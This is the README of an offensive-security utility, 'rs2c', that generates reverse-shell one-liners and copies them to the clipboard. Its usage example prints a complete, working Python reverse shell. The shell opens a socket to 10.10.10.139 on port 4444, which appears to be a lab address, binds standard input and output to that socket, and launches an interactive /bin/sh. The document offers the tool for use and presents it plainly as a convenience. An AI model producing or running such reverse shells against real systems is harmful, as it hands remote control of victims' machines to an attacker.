# Reverse Shell to Clipboard

Reverse Shell to Clipboard is a tool that will facilitate the task of creating a reverse shell according to the programming language you need.
## Installation

You can use it directly as a sh or for quick access you can copy into
/usr/local/bin


## Usage

If you don't have it copied to /usr/local/bin you will have to use it as ./rs2c inside the folder where it is hosted.
If you have it copied to /usr/local/bin you can use it from any folder with rs2c command.
```bash
$ rs2c python 10.10.10.139 4444
>[*] Reverse shell copied to clipboard 
```
If you now paste it with Ctrl + Shift + v you will see the following
```bash
$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.139',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);' 
```

## Contributing
Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.

